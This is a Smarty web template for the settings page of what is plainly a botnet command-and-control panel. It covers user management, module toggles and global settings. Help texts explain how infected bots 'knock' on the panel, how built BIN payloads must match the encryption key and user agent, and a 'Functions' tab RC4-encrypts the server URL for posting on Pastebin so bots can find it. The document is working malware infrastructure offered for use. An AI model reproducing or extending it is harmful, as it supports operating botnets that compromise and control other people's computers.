
{include file="header.tpl"}
{include file="nav.tpl"}


<!-- Modal -->
<div class="modal fade" id="createnewUser" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel">Create new User</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <form method="POST">
                <div class="modal-body">
                    <div class="form-group">
                        <label for="createuser_password">Username</label>
                        <input type="text" class="form-control" name="createuser_username"  id="createuser_password" placeholder="Username" required>
                    </div>
                    <div class="form-group">
                        <label for="createuser_password">Password</label>
                        <input type="password" class="form-control" name="createuser_password"  id="createuser_password"  placeholder="Password" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Save changes</button>
                </div>
            </form>
        </div>
    </div>
</div>


<div class="page-header">
    <div class="container-fluid">
        <h2 class="h5 no-margin-bottom">Settings</h2>
    </div>
</div>

<div class="col-md-12 col-lg-12">
    <div class="">

        <ul class="nav nav-tabs" role="tablist">
            <li class="nav-item">
                <a class="nav-link active" href="#users" role="tab" data-toggle="tab">Users</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#globalsettings" role="tab" data-toggle="tab">Global Settings</a>
            </li>

            <li class="nav-item">
                <a class="nav-link" href="#functions" role="tab" data-toggle="tab">Functions</a>
            </li>


            <li class="nav-item">
                <a class="nav-link" href="#plugins" role="tab" data-toggle="tab">Modules</a>
            </li>

            {foreach from=$pluginSetting_Tabs item=addTab}
                <li class="nav-item">
                    <a class="nav-link" href="#{$addTab.name}" role="tab" data-toggle="tab">{$addTab.name}</a>
                </li>
            {/foreach}
            <!--       <li class="nav-item">
                        <a class="nav-link" href="#update" role="tab" data-toggle="tab">Update</a>
                    </li> -->
        </ul>

        <!-- Tab panes -->
        <div class="tab-content">
            <div role="tabpanel" class="tab-pane active" id="users">

                <table class="table">
                    <thead>
                    <tr>
                        <th>Username</th>
                        <th>
                            <button type="button" class="btn btn-primary createnewUser" data-toggle="modal" data-target="#createnewUser">
                                Create new User
                            </button>
                        </th>
                    </tr>
                    </thead>
                    <tbody>

                    {foreach from=$users item=user}
                        <tr>
                            <td>{$user.username}</td>
                            <td>
                                <form method="POST" id="blockuser-{$user.id}">
                                    <a href="/edituser/{$user.id}"> Edit </a>
                                    <input name="userid" value="{$user.id}" hidden>
                                    {if $user.active == "1"}
                                        <input name="blockuser" value="lock" hidden>
                                        <img width="19" onclick="document.getElementById('blockuser-{$user.id}').submit()" src="{$includeDir}assets/img/unlock.svg" title="User is Active">
                                    {else}
                                        <input name="blockuser" value="unlock" hidden>
                                        <img width="19" onclick="document.getElementById('blockuser-{$user.id}').submit()" src="{$includeDir}assets/img/lock.svg" title="User is Banned">
                                    {/if}
                                </form>
                            </td>
                        </tr>
                    {/foreach}

                    </tbody>
                </table>

            </div>
            <div role="tabpanel" class="tab-pane fade" id="globalsettings">
                <form method="POST">
                    <div class="form-group">
                        <label for="updateinfo">Panel Update polling URL</label>
                        <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="looks like: https://pastebin.com/raw/YBGEBviB">
                        <small id="updateinfoHelper" class="form-text text-muted">The URL, which the panel will use to check for panel-updates. check darktools.me for the current polling URL.</small>
                    </div>
                      <div class="form-group">
                            <label for="enryptionkey">Encryption Key</label>
                            <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="example: gh1IOtF2L1IffjOtsIDiQnQJrkLk8WJ5">
                            <small id="enryptionkeyHelper" class="form-text text-muted">Must be used with every built BIN. If you change the key, old builds/bots are unable to connect.</small>
                        </div>
                       <div class="form-group">
                            <label for="useragent">User Agent</label>
                            <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0">
                            <small id="useragentHelper" class="form-text text-muted">The Bots will use this User Agent to knock on the panel. Must be used with every built BIN. If you change the string, old builds/bots are unable to connect.</small>
                        </div>

                        <div class="form-group">
                            <label for="useragent">Knock interval value</label>
                            <input type="number" class="form-control" name="requestinterval" value="{$config.requestinterval}" id="requestinterval" aria-describedby="requestintervalHelp" placeholder="example: 600">
                            <small id="requestintervalHelper" class="form-text text-muted">The number of seconds, the Bots will wait before they knock on the panel again, to report that they are online or ask for new tasks. If your Server faces high load utilization, you want to set a higher value. Don’t forget to build a new BIN, using the same, new value. You want to update your Bots to the new BIN.</small>
                        </div>

                    <input type="submit" class="btn btn-primary" value="Save">
                </form>
            </div>
            <div role="tabpanel" class="tab-pane fade" id="update">
                <div class="updatecenter">
                    <a class="bttn version_check" id="1" style="cursor: pointer;">Check for Updates</a>
                    <div class="loading"></div>
                </div>
            </div>



            <div role="tabpanel" class="tab-pane fade" id="functions">
                <form method="POST">
                    {if $encryptedOUT != ""}
                        <div class="alert alert-success" role="alert">
                            Add this to your Pastebin: <b><pre>{$encryptedOUT}</pre></b>
                        </div>
                        <a  class="btn btn-primary"  href="/settings">Reload</a>
                    {else}
                        <div class="form-group">
                            <label for="encrypt">Encrypt RC4 Cipher</label>
                            <input type="text" class="form-control" name="encrypt"  id="encrypt" aria-describedby="emailHelp" placeholder="By Default: http://0.0.0.0/request">
                            <small id="encryptHelper" class="form-text text-muted">Encrypt your current Server URL before create a Pastebin with it. (0.0.0.0 is your IP)</small>
                        </div>
                        <input type="submit" class="btn btn-primary" value="Encrypt">
                    {/if}
                </form>
            </div>
            <div role="tabpanel" class="tab-pane fade" id="plugins">

                <table class="table">
                    <tbody>
                    {foreach from=$foundPlugins item=plugin}
                        <tr>
                            <td>
                                <form method="POST" id="pluginsForm-{$plugin.name}">
                                    <input value="{$plugin.name}" name="pluginChanger" hidden>
                                    {if $plugin.active == "1"}
                                        <label class="switch">
                                            <input data-id="{$plugin.name}" type="checkbox" checked>
                                            <span class="slider round"></span>
                                        </label>
                                    {else}
                                        <label class="switch">
                                            <input data-id="{$plugin.name}" type="checkbox" >
                                            <span class="slider round"></span>
                                        </label>
                                    {/if}
                                </form>
                            </td>
                            <td>
                               <h6>  {$plugin.name} {if $plugin.info} <sup><strong>{$plugin.info.version}</strong></sup> {/if}</h6>

                            </td>
                            <td> {if $plugin.info} {if $plugin.info.state}  <span class="stable"> {$plugin.info.state}  </span> {/if} {else} <span class="alpha">alpha</span> {/if}</td>
                        </tr>
                    {/foreach}

                    </tbody>
                </table>
            </div>

            {foreach from=$pluginSetting_Tabs item=addTab}
                <div role="tabpanel" class="tab-pane fade" id="{$addTab.name}">
                    {if $addTab.includeDir != ""}

                        {include file=$addTab.includeDir}
                    {else}
                        {$addTab.body}
                    {/if}
                </div>
            {/foreach}

        </div>

    </div>
</div>

{include file="footer.tpl"}

<script>


    // function to reorder
    $(document).ready(function(){

        $("input[type=checkbox]").change(function(e){
            console.log($(this).attr("data-id"));
            $('#pluginsForm-'+$(this).attr("data-id")).submit();

        });

        // check users files and update with most recent version
        $(".version_check").on('click',function(e) {
            //$(".loading").show();
            var uid = $(this).attr("id");
            var info = "uid="+uid+"&vcheck=1";
            $.ajax({
                beforeSend: function(){
                    $(".loading").html('<br><img src="loader.gif" width="16" height="16" />');
                },
                type: "POST",
                url: "version_check",
                data: info,
                dataType: "json",
                success: function(data){
                    // clear loading information
                    $(".loading").html("");
                    // check for version verification
                    if(data.version != 0){
                        $(".version_check").remove();
                        $(".loading").html("<p><b>"+data.version+"</b> Version is Released. You are outdated</p>  <a id='1' class='bttn doUpdate'>START UPDATE</a>");


                        $(".doUpdate").on('click',function(e) {
                            //$(".loading").show();
                            var uid = $(this).attr("id");
                            var info = "uid="+uid+"&vcheck=1";
                            // clear loading information
                            $(".loading").html("");
                            // check for version verification
                            if(data.version != 0){
                                var uInfo = "uid="+uid+"&vnum="+data.version
                                $.ajax({
                                    beforeSend: function(){
                                        $(".loading").html('<br><img src="loader.gif" width="16" height="16" />');
                                    },
                                    type: "POST",
                                    url: "doUpdate",
                                    data: uInfo,
                                    dataType: "json",
                                    success: function(data){
                                        // check for version verification
                                        if(data.copy != 0){
                                            if(data.unzip == 1){
                                                // clear loading information
                                                $(".version_check").html("");
                                                // successful update
                                                $(".loading").html("Successful Update!");
                                            }else{
                                                // error during update/unzip
                                                $(".loading").html("<br>Sorry, there was an error with the update.");
                                            }
                                        }
                                    },
                                    error: function() {
                                        // error
                                        $(".loading").html('<br>There was an error updating your files.');
                                    }
                                });
                            }
                        });


                    }else{
                        // user has the latest version already installed
                        $(".version_check").remove();
                        $(".loading").html("You already have the latest version.");
                    }
                },
                error: function() {
                    // error
                    $(".loading").html('<br>There was an error checking your latest version.');
                }
            });
        });


        // check users files and update with most recent version

    });










    // wire up shown event
    $('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
        console.log("tab shown...");
        localStorage.setItem('activeTab', $(e.target).attr('href'));
    });

    // read hash from page load and change tab
    var activeTab = localStorage.getItem('activeTab');
    if(activeTab){
        $('.nav-tabs a[href="' + activeTab + '"]').tab('show');
    }
</script>